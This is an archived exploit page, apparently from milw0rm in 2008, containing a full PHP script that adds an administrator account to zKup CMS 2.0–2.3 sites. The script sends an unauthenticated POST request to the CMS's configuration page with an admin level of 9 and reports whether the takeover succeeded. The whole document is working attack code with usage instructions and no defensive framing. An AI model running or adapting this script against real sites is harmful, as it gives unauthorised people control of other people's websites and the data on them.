<html><head><title>zKup CMS 2.0 <= 2.3 Remote Add Admin Exploit</title></head><pre>#!/usr/bin/php
&lt;?php
/*
 * Name:    zKup CMS v2.0 &lt;= v2.3 0-day exploit (add admin)
 * Credits: Charles &quot;real&quot; F. &lt;charlesfol[at]hotmail.fr&gt;
 * Date:    03-08-2008
 * Conditions: None.
 *
 * This exploit add a new zKup admin.
 *
 */

print &quot;\n&quot;;
print &quot;   zKup CMS v2.0 &lt;= v2.3 0-day exploit (add admin)\n&quot;;
print &quot;       by Charles \&quot;real\&quot; F. &lt;charlesfol[at]hotmail.fr&gt;\n\n&quot;;

if($argc&lt;4) { print &quot;usage: php zkup2_admin_exploit.php &lt;url&gt; &lt;login&gt; &lt;passwd&gt;\n   eg: php zkup2_admin_exploit.php http://127.0.0.1/votresite/ real p4ssw0rd&quot;;exit(-1); }
$url = $argv[1];
$log = $argv[2];
$pas = $argv[3];

$postit = &quot;action=ajout&amp;login=$log&amp;mdp=$pas&amp;mdp2=$pas&amp;lvl=9&quot;;

print &quot;[*] sending evil c0de ... &quot;;
if(preg_match(&quot;#alert#i&quot;,post($url.&quot;admin/configuration/modifier.php&quot;,&quot;$postit&quot;))) print &quot;done.\n&quot;;
else print &quot;failed.\n&quot;;

function post($url,$data,$get=1)
{
	$result = '';
	preg_match(&quot;#^http://([^/]+)(/.*)$#i&quot;,$url,$info);
	$host = $info[1];
	$page = $info[2];
	$fp = fsockopen($host, 80, &amp;$errno, &amp;$errstr, 30);
	
	$req  = &quot;POST $page HTTP/1.1\r\n&quot;;
	$req .= &quot;Host: $host\r\n&quot;;
	$req .= &quot;User-Agent: Mozilla Firefox\r\n&quot;;
	$req .= &quot;Connection: close\r\n&quot;;
	$req .= &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;;
	$req .= &quot;Content-length: &quot;.strlen( $data ).&quot;\r\n&quot;;
	$req .= &quot;\r\n&quot;;
	$req .= $data.&quot;\r\n&quot;;

	fputs($fp,$req);
	
	if($get) while(!feof($fp)) $result .= fgets($fp,128);
	
	fclose($fp);
	return $result;
}

?&gt;

# milw0rm.com [2008-03-07]</pre></html>